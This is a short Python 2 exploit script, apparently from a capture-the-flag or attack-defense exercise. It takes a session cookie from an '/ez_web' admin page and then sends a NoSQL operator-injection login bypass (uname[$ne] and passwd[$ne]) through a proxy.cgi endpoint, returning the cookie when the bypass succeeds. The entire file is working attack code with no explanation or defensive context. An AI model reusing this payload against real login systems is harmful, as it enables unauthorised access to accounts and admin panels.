#!/usr/bin/env python


from http import http
from config import *
from function import *

def login(target):
    res = http("get",target,target_port,"/ez_web/admin/index.php","",{})
    pos_1 = res.find("PHPSESSID=")
    pos_2 = res.find("path")
    cookie = res[pos_1:pos_2]
    print cookie
    data = "uname[$ne]=666&passwd[$ne]=123456&target=login.cgi"
    res = http("get",target,target_port,"/ez_web/cgi-bin/proxy.cgi?"+data,"",{"Cookie":cookie})
    if "success" in res:
	return cookie
    return False

login("127.0.0.1")
